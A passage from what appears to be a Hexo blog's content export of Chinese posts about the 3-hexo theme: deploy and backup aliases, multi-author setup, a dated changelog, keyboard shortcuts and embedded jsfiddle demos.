<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> hs=<span class="string">&#x27;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&#x27;</span>  <span class="comment">#启动本地服务</span></span><br><span class="line"><span class="built_in">alias</span> hd=<span class="string">&#x27;hexo clean &amp;&amp; hexo g &amp;&amp; hexo d&#x27;</span>  <span class="comment">#部署博客</span></span><br></pre></td></tr></table></figure>
<p>甚至你也可以加入备份文章的命令，可以自由发挥。</p>
<h3 id="6-3-博客备份（快捷命令升级版）"><a href="#6-3-博客备份（快捷命令升级版）" class="headerlink" title="6.3 博客备份（快捷命令升级版）"></a>6.3 博客备份（快捷命令升级版）</h3><p>为了保证我们写的文章不丢失、快速迁移博客，都需要备份我们的blog。</p>
<ol>
<li>博客根目录，执行 <code>git init</code> 创建 git 仓库。</li>
<li>在 github（或其他托管平台、自建远程仓库等） 创建仓库并和本地仓库建立联系。</li>
<li>在 <code>~/.bashrc</code> 文件中添加<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> hs=<span class="string">&#x27;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> hd=<span class="string">&#x27;hexo clean &amp;&amp; hexo g &amp;&amp; hexo d &amp;&amp; git add . &amp;&amp; git commit -m &quot;update&quot; &amp;&amp; git push -f&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>这样，我们在执行 <code>hd</code> 进行部署时，就一同将博客进行备份了</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo多作者模式</title>
    <url>//3-hexo-multiple-author</url>
    <content><![CDATA[<p>尽管hexo是为个人blog而生的工具，但是有时也可能会有多作者需求，比如他人投稿等等，为此笔者在写3-hexo主题时,顺便添加了此功能 。</p>
<h2 id="1-修改配置文件"><a href="#1-修改配置文件" class="headerlink" title="1.修改配置文件"></a>1.修改配置文件</h2><p>修改 <code>3-hexo/_config.yml</code>，开启多作者模式，并添加blog中出现的作者，为搜索提供数据</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">author:</span><br><span class="line">  on: true #true：开启多作者模式</span><br><span class="line">  authors:</span><br><span class="line">    author1: yelog #添加两个作者yelog、小马哥</span><br><span class="line">    author2: 小马哥</span><br></pre></td></tr></table></figure>

<h2 id="2-修改文章头部信息"><a href="#2-修改文章头部信息" class="headerlink" title="2.修改文章头部信息"></a>2.修改文章头部信息</h2><p>添加 <code>author: yelog</code> ，表示这篇文章的作者为yelog</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: reading-list</span><br><span class="line">date: 2017-01-31 15:29:32</span><br><span class="line">author: yelog</span><br><span class="line">top: 2</span><br><span class="line">categories:</span><br><span class="line">- 读书</span><br><span class="line">tags:</span><br><span class="line">- reading</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p><strong>效果：</strong><br><img src="http://img.saodiyang.com/Fjq0M7pBzl6fsnC3ivpqMsdLdXc0.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fjq0M7pBzl6fsnC3ivpqMsdLdXc0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h2 id="搜索某个作者的所有文章"><a href="#搜索某个作者的所有文章" class="headerlink" title="搜索某个作者的所有文章"></a>搜索某个作者的所有文章</h2><p>在搜索栏中输入<code>@小马哥</code>就可以显示出所有小马哥的文章。<br>如果你在_config.xml中配置了作者名，就可以出现<code>提示</code>,具体看第一部分<br><strong>效果如下：</strong><br><img src="http://img.saodiyang.com/Fm2PK5W9Rd6ojYq055zZoWcbioAn.gif" class="lazyload" data-srcset="http://img.saodiyang.com/Fm2PK5W9Rd6ojYq055zZoWcbioAn.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo开发日志-持续更新</title>
    <url>/1.yelog/tools/3-hexo%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h2 id="2020年12月"><a href="#2020年12月" class="headerlink" title="2020年12月"></a>2020年12月</h2><h3 id="12-28"><a href="#12-28" class="headerlink" title="12-28"></a>12-28</h3><ol>
<li><code>fix</code> 修复了右下角按钮错位问题</li>
<li><code>enhance</code> 优化图标样式，支持自定义图标引入</li>
<li><code>change</code> 分类超出隐藏</li>
</ol>
<h2 id="2020年8月"><a href="#2020年8月" class="headerlink" title="2020年8月"></a>2020年8月</h2><h3 id="08-09"><a href="#08-09" class="headerlink" title="08-09"></a>08-09</h3><ol>
<li><code>fix</code> 修复了切换大纲时，未关闭全局搜索框(in:) 的问题<br><a href="2">2</a>. <code>add</code> 代码块新增显示代码类型和复制代码功能</li>
<li><code>fix</code>分类支持 <code>\/#.[]()</code> 特殊字符</li>
<li><code>fix</code> 大纲支持<code>URI</code> 编码，兼容 <code>hexo5+</code></li>
</ol>
<h2 id="2020年5月"><a href="#2020年5月" class="headerlink" title="2020年5月"></a>2020年5月</h2><h3 id="05-29"><a href="#05-29" class="headerlink" title="05-29"></a>05-29</h3><ol>
<li><code>fix</code> 修复了旧版 hexo 报错的问题</li>
</ol>
<h3 id="05-23"><a href="#05-23" class="headerlink" title="05-23"></a>05-23</h3><ol>
<li><code>change</code> 由于 <code>cloudflare</code> 国内访问不稳定，故 <code>cdn</code> 切换到 <code>jsdelivr</code></li>
<li><code>fix</code> 修复文章大纲为空时，同步大纲报错的问题</li>
<li><code>change</code> 文章内 toc 生成从 <code>@【toc】</code> 改为 <code>【toc】</code> </li>
<li><code>enhance</code> 快捷键支持关闭 <code>shortcutKey: false</code></li>
<li><code>add</code> 添加第三方评论 来必力 和 utteranc</li>
<li><code>remove</code> 移除网易云评论</li>
</ol>
<h3 id="05-21"><a href="#05-21" class="headerlink" title="05-21"></a>05-21</h3><ol>
<li><code>add</code> 添加备案号配置</li>
</ol>
<h3 id="05-20"><a href="#05-20" class="headerlink" title="05-20"></a>05-20</h3><ol>
<li><code>enhance</code> 内置文章排序，无需再引入排序插件或修改源代码</li>
<li><code>enhance</code> 支持自定义分类的顺序， 具体可以查看 <a href="#">Post not found: 3-hexo-instruction</a> 中的排序相关内容</li>
</ol>
<h3 id="05-19"><a href="#05-19" class="headerlink" title="05-19"></a>05-19</h3><ol>
<li><code>change</code> 重做了文章大纲</li>
<li><code>change</code> 重做了搜索/标签页</li>
<li><code>style</code> 优化了整体界面风格</li>
<li><code>fix</code>修复了诸如 <strong>分类选中动画闪烁</strong> 等细节问题</li>
</ol>
<h2 id="2020年2月"><a href="#2020年2月" class="headerlink" title="2020年2月"></a>2020年2月</h2><h3 id="02-04"><a href="#02-04" class="headerlink" title="02-04"></a>02-04</h3><p>1.<code>fix</code>: 修复 gitalk 使用  app API query parameter 弃用的问题</p>
<h2 id="2019年11月"><a href="#2019年11月" class="headerlink" title="2019年11月"></a>2019年11月</h2><h3 id="11-12"><a href="#11-12" class="headerlink" title="11-12"></a>11-12</h3><p>1.<code>fix</code>: 修复 hexo4.0 版本链接外跳的问题<br>2.<code>add</code>: 支持 mermaid <a href="#">Post not found: 3-hexo-support-mermaid</a></p>
<h3 id="09-24"><a href="#09-24" class="headerlink" title="09-24"></a>09-24</h3><p>1.<code>add</code>: 支持文章内 toc 生成 <a href="#">Post not found: 3-hexo-toc</a></p>
<h3 id="09-05"><a href="#09-05" class="headerlink" title="09-05"></a>09-05</h3><p>1.<code>fix</code>: <code>pjax</code> 兼容 <code>jsfiddle</code> 的渲染 <a href="#">Post not found: 3-hexo-jsfiddle</a></p>
<h2 id="2019年8月"><a href="#2019年8月" class="headerlink" title="2019年8月"></a>2019年8月</h2><h3 id="08-20"><a href="#08-20" class="headerlink" title="08-20"></a>08-20</h3><p>1.<code>fix</code>: 左下角菜单个数为一个时，在移动端出现的位置错乱的问题</p>
<h3 id="08-13"><a href="#08-13" class="headerlink" title="08-13"></a>08-13</h3><ol>
<li><code>add</code> 添加自定义左侧分类栏宽度 <code>category.width</code>，详情见 <code>_config.yml</code></li>
</ol>
<h3 id="08-01"><a href="#08-01" class="headerlink" title="08-01"></a>08-01</h3><ol>
<li><code>fix</code> 修复 友链 区域超出不滚动的问题</li>
</ol>
<h2 id="2019年7月"><a href="#2019年7月" class="headerlink" title="2019年7月"></a>2019年7月</h2><h3 id="07-22"><a href="#07-22" class="headerlink" title="07-22"></a>07-22</h3><ol>
<li><code>add</code> 新增修改文章列表颜色的参数</li>
</ol>
<h3 id="07-15"><a href="#07-15" class="headerlink" title="07-15"></a>07-15</h3><ol>
<li><code>fix</code> 修复 <strong>gitalk</strong> 由于作者停止了跨域的服务，借用其他人的跨域服务解决问题</li>
</ol>
<h3 id="07-12"><a href="#07-12" class="headerlink" title="07-12"></a>07-12</h3><ol>
<li><code>add</code> 新增图标：<strong>qq、酷狗、网易云音乐</strong></li>
<li><code>fix</code> 修复文末声明跨行的问题</li>
</ol>
<h2 id="2019年6月"><a href="#2019年6月" class="headerlink" title="2019年6月"></a>2019年6月</h2><h3 id="06-09"><a href="#06-09" class="headerlink" title="06-09"></a>06-09</h3><ol>
<li><code>fix</code> 修复了标签按钮在某些分辨率下错位问题。</li>
<li><code>fix</code> 修复了代码行数超百行时，行号溢出的问题</li>
</ol>
<h2 id="2019年5月"><a href="#2019年5月" class="headerlink" title="2019年5月"></a>2019年5月</h2><h3 id="05-21-1"><a href="#05-21-1" class="headerlink" title="05-21"></a>05-21</h3><ol>
<li><p><code>add</code> 文章分类可以显示文章数 <code>category&gt;num</code></p>
</li>
<li><p><code>add</code> 文章分类支持多级显示 <code>category&gt;sub</code></p>
</li>
<li><p><code>fix</code> 修复<code>gitalk</code>显示评论数错误的问题</p>
</li>
<li><p>添加背景图设置：</p>
<blockquote>
<p>① <code>_config.xml</code> 配置默认背景图片</p>
<p>首页背景图： <code>index_bg_img: xxx.jpg</code></p>
<p>文章页面背景图：<code>other_bg_img: xxx.jpg</code></p>
<p>② 我们还可以单独给某篇文章设置背景图（优先级最高）</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="number">3</span><span class="string">-hexo开发日志-持续更新</span></span><br><span class="line"><span class="attr">bgImg:</span> <span class="string">xxx.jpg</span>  <span class="comment">#设置这篇文章的背景图</span></span><br></pre></td></tr></table></figure></blockquote>
</li>
</ol>
<h3 id="05-05"><a href="#05-05" class="headerlink" title="05-05"></a>05-05</h3><ol>
<li><code>add</code> 添加代码段高亮样式配置，对应 markdown 语法 `` ，位置：<code>_config.yml</code> 关键字 <code>code</code></li>
</ol>
<h2 id="2019年1月"><a href="#2019年1月" class="headerlink" title="2019年1月"></a>2019年1月</h2><h3 id="01-05"><a href="#01-05" class="headerlink" title="01-05"></a>01-05</h3><ol>
<li><code>fix</code> 修复Firefox下，Tags 图标失效问题</li>
</ol>
<h2 id="2018年11月"><a href="#2018年11月" class="headerlink" title="2018年11月"></a>2018年11月</h2><h3 id="11-30"><a href="#11-30" class="headerlink" title="11-30"></a>11-30</h3><ol>
<li><code>add</code> 应用彩色图标，新增简书、知乎、csdn、oschina等图标<br><img src="http://img.saodiyang.com/Fgw7J7Ab6BGl09e-qHo5ZmY5D4lW.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fgw7J7Ab6BGl09e-qHo5ZmY5D4lW.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="应用彩色图标"></li>
<li><code>fix</code> 修复 gitment 登录报错的问题</li>
<li><code>enhance</code> 升级gitalk插件，并跟随官方版本</li>
</ol>
<h2 id="2018年8月"><a href="#2018年8月" class="headerlink" title="2018年8月"></a>2018年8月</h2><h3 id="08-08-修复"><a href="#08-08-修复" class="headerlink" title="08-08 修复"></a>08-08 修复</h3><ol>
<li><code>fix</code> : 修复左侧栏出现滚动条的问题</li>
</ol>
<h2 id="2018年4月"><a href="#2018年4月" class="headerlink" title="2018年4月"></a>2018年4月</h2><h3 id="04-18-修复"><a href="#04-18-修复" class="headerlink" title="04-18 修复"></a>04-18 修复</h3><ol>
<li><code>fix</code> : 调整原文地址key，解决和 encrypt 的冲突</li>
</ol>
<h2 id="2017年12月"><a href="#2017年12月" class="headerlink" title="2017年12月"></a>2017年12月</h2><h3 id="12-31-优化"><a href="#12-31-优化" class="headerlink" title="12-31 优化"></a>12-31 优化</h3><ol>
<li><code>enhance</code> : 关闭打赏，则屏蔽相关代码。</li>
</ol>
<h3 id="12-28-添加自定义菜单功能"><a href="#12-28-添加自定义菜单功能" class="headerlink" title="12-28 添加自定义菜单功能"></a>12-28 添加自定义菜单功能</h3><ol>
<li><code>add</code> : 添加自定义菜单功能，见配置文件 <code>menu:</code> 相关</li>
<li><code>fix</code> : 修复 <code>photoSwipe</code> 一些问题：手机端右上角图标遮挡、首页图片渲染失败、CDN引入配置文件</li>
</ol>
<h3 id="12-27-插件添加"><a href="#12-27-插件添加" class="headerlink" title="12-27 插件添加"></a>12-27 插件添加</h3><ol>
<li><code>add</code> : 引入 <code>photoSwipe</code> 图片相册，可在 <code>_config</code> 中 配置 <code>img_resize: photoSwipe</code></li>
<li><code>fix</code> : 左侧分类列表过多，则显示滚动条</li>
<li><code>change</code> : 由于cdnjs最近在国内网络波动较大，将默认CDN改到bootcdn</li>
</ol>
<h3 id="12-26-功能优化"><a href="#12-26-功能优化" class="headerlink" title="12-26 功能优化"></a>12-26 功能优化</h3><ol>
<li><code>enhance</code> : 全文检索支持通过方向键选择文章，回车跳转</li>
</ol>
<h3 id="12-24-功能添加"><a href="#12-24-功能添加" class="headerlink" title="12-24 功能添加"></a>12-24 功能添加</h3><ol>
<li><code>add</code> : 添加全文检索功能， 输入<code>in:</code>开头即可开始检索</li>
</ol>
<h2 id="2017年10月"><a href="#2017年10月" class="headerlink" title="2017年10月"></a>2017年10月</h2><h3 id="10-21-样式调整"><a href="#10-21-样式调整" class="headerlink" title="10-21 样式调整"></a>10-21 样式调整</h3><ol>
<li><code>enhance</code> : 优化了高亮样式 <code>atom-light</code></li>
</ol>
<h3 id="10-20-样式调整与添加"><a href="#10-20-样式调整与添加" class="headerlink" title="10-20 样式调整与添加"></a>10-20 样式调整与添加</h3><ol>
<li><code>add</code> : 添加列表样式 <code>thread</code></li>
<li><code>add</code> : 添加引用块样式 <code>bracket</code></li>
<li><code>add</code> : 文章列表可加入背景图</li>
</ol>
<h3 id="10-07"><a href="#10-07" class="headerlink" title="10-07"></a>10-07</h3><ol>
<li><code>add</code> : 加入关于/友链页面</li>
</ol>
<h2 id="2017年9月"><a href="#2017年9月" class="headerlink" title="2017年9月"></a>2017年9月</h2><h3 id="09-21"><a href="#09-21" class="headerlink" title="09-21"></a>09-21</h3><ol>
<li><code>polish</code> : 引入<code>fragment_cache</code>局部缓存，大幅缩减渲染(hexo g)的时间 <a href="#">Post not found: hexo-fragment_cache</a></li>
<li><code>enhance</code> : 加入 SEO ，tag转keywords , title转description</li>
<li><code>add</code> : 添加文末说明参数</li>
<li><code>lit</code> : 头像跳转首页的请求也处理为 pjax</li>
</ol>
<h2 id="2017年7月"><a href="#2017年7月" class="headerlink" title="2017年7月"></a>2017年7月</h2><h3 id="07-05-添加MathJax数学公式支持"><a href="#07-05-添加MathJax数学公式支持" class="headerlink" title="07-05 添加MathJax数学公式支持"></a>07-05 添加MathJax数学公式支持</h3><ol>
<li><code>add</code> : 添加MathJax数学公式支持 <a href="#">Post not found: 3-hexo-mathjax</a></li>
</ol>
<h2 id="2017年6月"><a href="#2017年6月" class="headerlink" title="2017年6月"></a>2017年6月</h2><h3 id="06-26-添加gitment评论系统"><a href="#06-26-添加gitment评论系统" class="headerlink" title="06-26 添加gitment评论系统"></a>06-26 添加gitment评论系统</h3><ol>
<li><code>add</code> : 添加gitment评论系统，具体可参考 <a href="#">Post not found: gitment</a></li>
</ol>
<h2 id="2017年4月"><a href="#2017年4月" class="headerlink" title="2017年4月"></a>2017年4月</h2><h3 id="04-27-调整样式"><a href="#04-27-调整样式" class="headerlink" title="04-27 调整样式"></a>04-27 调整样式</h3><ol>
<li><code>change</code>：调整引用块内p的样式。</li>
</ol>
<h3 id="04-19-调整样式和修复bug"><a href="#04-19-调整样式和修复bug" class="headerlink" title="04-19 调整样式和修复bug"></a>04-19 调整样式和修复bug</h3><ol>
<li><code>change:</code>调整文章目录间距</li>
<li><code>fix:</code>修复可能出现的访问量不显示的问题</li>
</ol>
<h3 id="04-17-调整样式及修复bug"><a href="#04-17-调整样式及修复bug" class="headerlink" title="04-17 调整样式及修复bug"></a>04-17 调整样式及修复bug</h3><ol>
<li><code>change:</code>调整大屏下文章最大宽度（从780调到900），代码字号调整为比文字小3px</li>
<li><code>fix:</code>修复在过滤条件下，鼠标上下键不能正常在第一个，最后一个进行跳转的问题</li>
<li><code>fix:</code>修复首页可能出现的错误渲染，导致没有样式的情况。</li>
</ol>
<h2 id="2017年3月"><a href="#2017年3月" class="headerlink" title="2017年3月"></a>2017年3月</h2><h3 id="03-29-增强文章列表上下键功能"><a href="#03-29-增强文章列表上下键功能" class="headerlink" title="03-29 增强文章列表上下键功能"></a>03-29 增强文章列表上下键功能</h3><ol>
<li><code>enhance:</code>增强列表跟随选择的文章上下滚动</li>
<li><code>enhance:</code>文章列表上下循环</li>
</ol>
<h3 id="03-24-修复搜索及添加快捷键"><a href="#03-24-修复搜索及添加快捷键" class="headerlink" title="03-24 修复搜索及添加快捷键"></a>03-24 修复搜索及添加快捷键</h3><ol>
<li><code>fix:</code>修复title关键字和标签关键字冲突的情况</li>
<li><code>fix:</code>修复前进后退时对图片的错误处理</li>
<li><code>enhance:</code>在搜索时，可以键盘上下键来选择文章</li>
<li><code>enhance:</code>添加了一些快捷键，详情查看 <a href="#">Post not found: 3-hexo-shortcuts</a></li>
</ol>
<h3 id="03-22-添加评论系统"><a href="#03-22-添加评论系统" class="headerlink" title="03-22 添加评论系统"></a>03-22 添加评论系统</h3><ol>
<li><code>enhance:</code> 添加网易云跟帖评论系统</li>
</ol>
<h3 id="03-21-图片放大动画"><a href="#03-21-图片放大动画" class="headerlink" title="03-21 图片放大动画"></a>03-21 图片放大动画</h3><ol>
<li><code>enhance:</code>增加图片放大动画，增加过度感，最大放大至原图大小（若尺寸超过屏幕，按屏幕大小限制）</li>
</ol>
<h3 id="03-20-评论添加锚点"><a href="#03-20-评论添加锚点" class="headerlink" title="03-20 评论添加锚点"></a>03-20 评论添加锚点</h3><ol>
<li><code>enhance:</code>添加文章meta(标题下)中的评论数点击事件，滑动到评论区，评论区若隐藏，则自动打开</li>
</ol>
<h3 id="03-19-修复firfox错位问题"><a href="#03-19-修复firfox错位问题" class="headerlink" title="03-19 修复firfox错位问题"></a>03-19 修复firfox错位问题</h3><ol>
<li><code>fix:</code>修复firefox错位问题</li>
<li><code>enhance:</code>文章标题下的分类、标签、作者在文章列表隐藏的情况下（包括移动端）点击，自动呼出文章列表</li>
</ol>
<h3 id="03-18-动画优化及修复bug"><a href="#03-18-动画优化及修复bug" class="headerlink" title="03-18 动画优化及修复bug"></a>03-18 动画优化及修复bug</h3><ol>
<li><code>enhance:</code>给所有锚点添加动画</li>
<li><code>fix:</code>修复文章列表页自适应宽度,解决由于firefox不支持自定义滚动条导致的错位</li>
<li><code>change:</code>改动页面内站点访问量统计的标签，改动查看 — <a href="#">Post not found: 3-hexo-homepage</a></li>
</ol>
<h3 id="03-17-评论调整优化"><a href="#03-17-评论调整优化" class="headerlink" title="03-17 评论调整优化"></a>03-17 评论调整优化</h3><ol>
<li>修复预加载时的评论数</li>
<li>首页添加评论框</li>
</ol>
<h3 id="03-16-文章meta样式修改"><a href="#03-16-文章meta样式修改" class="headerlink" title="03-16 文章meta样式修改"></a>03-16 文章meta样式修改</h3><ol>
<li>将文章meta（包括文集、标签、时间、字数等）改到文章title下方</li>
<li>站点版权信息（@2017 Yelog）,自定义，在主题 <code>_config.yml</code> 中配置</li>
<li>文章meta中添加评论数</li>
</ol>
<h3 id="03-15-增加样式"><a href="#03-15-增加样式" class="headerlink" title="03-15 增加样式"></a>03-15 增加样式</h3><ol>
<li>扩展了文章列表的移入样式，位置 <code>_config.yml</code> 中 <code>article_list</code></li>
</ol>
<h3 id="03-14-打赏优化"><a href="#03-14-打赏优化" class="headerlink" title="03-14 打赏优化"></a>03-14 打赏优化</h3><ol>
<li>加入切换二维码动画</li>
<li>移动端样式调整</li>
</ol>
<h3 id="03-13-首页重构"><a href="#03-13-首页重构" class="headerlink" title="03-13 首页重构"></a>03-13 首页重构</h3><ol>
<li>将首页改写为md格式，方便博主更改，位置：/layout/index.md</li>
</ol>
<h3 id="03-09-修复多说、添加流量统计"><a href="#03-09-修复多说、添加流量统计" class="headerlink" title="03-09 修复多说、添加流量统计"></a>03-09 修复多说、添加流量统计</h3><ol>
<li>修复多说在pjax中的使用</li>
<li>添加字数统计功能</li>
<li>添加文章版权信息</li>
</ol>
<h3 id="03-06-添加打赏功能"><a href="#03-06-添加打赏功能" class="headerlink" title="03-06 添加打赏功能"></a>03-06 添加打赏功能</h3><ol>
<li>添加打赏功能</li>
<li>添加table样式</li>
</ol>
<h3 id="03-04-添加作者和标签的提示"><a href="#03-04-添加作者和标签的提示" class="headerlink" title="03-04 添加作者和标签的提示"></a>03-04 添加作者和标签的提示</h3><ol>
<li>输入#或@显示下拉提示</li>
</ol>
<h3 id="03-03-修复多作者模式"><a href="#03-03-修复多作者模式" class="headerlink" title="03-03 修复多作者模式"></a>03-03 修复多作者模式</h3><ol>
<li>修复开启多作者模式时，文章没有作者引起的异常</li>
</ol>
<h3 id="03-02-图片样式改动"><a href="#03-02-图片样式改动" class="headerlink" title="03-02 图片样式改动"></a>03-02 图片样式改动</h3><ol>
<li>alt显示在图片下方</li>
<li>图片放大功能</li>
<li>移动端图片宽度100%</li>
</ol>
<h2 id="2017年2月"><a href="#2017年2月" class="headerlink" title="2017年2月"></a>2017年2月</h2><h3 id="02-28-多作者模式"><a href="#02-28-多作者模式" class="headerlink" title="02-28 多作者模式"></a>02-28 多作者模式</h3><ol>
<li>添加多作者模式</li>
</ol>
<h3 id="02-27-调整样式"><a href="#02-27-调整样式" class="headerlink" title="02-27 调整样式"></a>02-27 调整样式</h3><ol>
<li>修改a的样式</li>
<li>调整移动端宽度</li>
</ol>
<h3 id="02-25-修改github仓库名"><a href="#02-25-修改github仓库名" class="headerlink" title="02-25 修改github仓库名"></a>02-25 修改github仓库名</h3><ol>
<li>修改github仓库名：从 <code>3-hexo</code> 到 <code>hexo-theme-3-hexo</code></li>
<li>添加回到顶端功能：小火箭</li>
<li>修复safari滑动bug</li>
</ol>
<h3 id="02-24-站点版权、ICON和置顶"><a href="#02-24-站点版权、ICON和置顶" class="headerlink" title="02-24 站点版权、ICON和置顶"></a>02-24 站点版权、ICON和置顶</h3><ol>
<li>添加站点版权信息</li>
<li>更换icon到icoMoon</li>
<li>添加置顶功能</li>
</ol>
<h3 id="02-20-代码块高亮主题"><a href="#02-20-代码块高亮主题" class="headerlink" title="02-20 代码块高亮主题"></a>02-20 代码块高亮主题</h3><ol>
<li>添加十几种代码高亮主题</li>
<li>移动端适配（ipad、手机）</li>
</ol>
<h3 id="02-19-移动端适配"><a href="#02-19-移动端适配" class="headerlink" title="02-19 移动端适配"></a>02-19 移动端适配</h3><ol>
<li>添加文章加载动画进度条</li>
<li>开始进行移动端适配</li>
</ol>
<h3 id="02-08-评论系统"><a href="#02-08-评论系统" class="headerlink" title="02-08 评论系统"></a>02-08 评论系统</h3><ol>
<li>添加多说评论</li>
<li>添加disqus评论</li>
</ol>
<h3 id="02-07-样式及动画新增修改"><a href="#02-07-样式及动画新增修改" class="headerlink" title="02-07 样式及动画新增修改"></a>02-07 样式及动画新增修改</h3><ol>
<li>添加标题和时间的title</li>
<li>添加头像下外链图标（facebook等）</li>
<li>添加目录显示动画</li>
</ol>
<h3 id="02-06-功能和样式开发"><a href="#02-06-功能和样式开发" class="headerlink" title="02-06 功能和样式开发"></a>02-06 功能和样式开发</h3><ol>
<li>添加全屏和目录功能</li>
<li>搜索框下添加tags的显示，并支持使用#搜索</li>
<li>CDN改为在_config.yml中配置</li>
</ol>
<h3 id="02-05-开源3-hexo主题"><a href="#02-05-开源3-hexo主题" class="headerlink" title="02-05 开源3-hexo主题"></a>02-05 开源3-hexo主题</h3><ol>
<li>设计主题页面结构</li>
<li>分类过滤和标题关键字搜索</li>
<li>使用pjax方式加载页面</li>
<li>添加引用、表格等样式</li>
<li>使用highlight.js来处理代码块高亮</li>
<li>命名为3-hexo并在github上开源e</li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo快捷键说明</title>
    <url>//3-hexo-shortcuts</url>
    <content><![CDATA[<p>今日公司断网了半个小时，就利用这段时间给主题添加了快捷键操作，方便使用。</p>
<p>快捷键为vim风格的。按键可能与vimium（chrome插件）的快捷键有冲突，插件设置屏蔽掉此站的快捷键即可</p>
<p>如果有比较好的建议，欢迎骚扰。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="全局"><a href="#全局" class="headerlink" title="全局"></a>全局</h3><table>
<thead>
<tr>
<th align="left">Key</th>
<th align="left">Descption</th>
</tr>
</thead>
<tbody><tr>
<td align="left">s/S</td>
<td align="left">全屏/取消全屏</td>
</tr>
<tr>
<td align="left">w/W</td>
<td align="left">打开/关闭文章目录</td>
</tr>
<tr>
<td align="left">i/I</td>
<td align="left">获取搜索框焦点</td>
</tr>
<tr>
<td align="left">j/J</td>
<td align="left">向下滑动</td>
</tr>
<tr>
<td align="left">k/K</td>
<td align="left">向上滑动</td>
</tr>
<tr>
<td align="left">gg/GG</td>
<td align="left">到最顶端</td>
</tr>
<tr>
<td align="left">shift+G/g</td>
<td align="left">到最下端</td>
</tr>
</tbody></table>
<h3 id="搜索框"><a href="#搜索框" class="headerlink" title="搜索框"></a>搜索框</h3><table>
<thead>
<tr>
<th align="left">Key</th>
<th align="left">Descption</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ESC</td>
<td align="left">1.如果输入框有内容，清除内容<br>2.如果输入框无内容，失去焦点</td>
</tr>
<tr>
<td align="left">下</td>
<td align="left">向下选择文章</td>
</tr>
<tr>
<td align="left">上</td>
<td align="left">向上选择文章</td>
</tr>
<tr>
<td align="left">回车</td>
<td align="left">打开当前选中的文章，若没有，则默认打开第一个</td>
</tr>
</tbody></table>
<h3 id="关闭快捷键"><a href="#关闭快捷键" class="headerlink" title="关闭快捷键"></a>关闭快捷键</h3><p>在主题下 <code>_config.yml</code> 中 找到 <code>shortcutKey</code> 设为 <code>false</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">shortcutKey:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo支持jsfiddle渲染</title>
    <url>//3-hexo-jsfiddle</url>
    <content><![CDATA[<h3 id="1-canvas-粒子效果"><a href="#1-canvas-粒子效果" class="headerlink" title="1. canvas 粒子效果"></a>1. canvas 粒子效果</h3><script async src="//jsfiddle.net/yelog/eqc7zdLo/embed/result,js,html,css/"></script>

<h3 id="2-复选框动画"><a href="#2-复选框动画" class="headerlink" title="2. 复选框动画"></a>2. 复选框动画</h3><script async src="//jsfiddle.net/yelog/5g9jf31t/1/embed/result,html,css/"></script>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo支持mermaid图表</title>
    <url>//3-hexo-support-mermaid</url>
    <content><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><h3 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h3><ol>
<li>安装hexo插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-filter-mermaid-diagrams</span><br></pre></td></tr></table></figure></li>
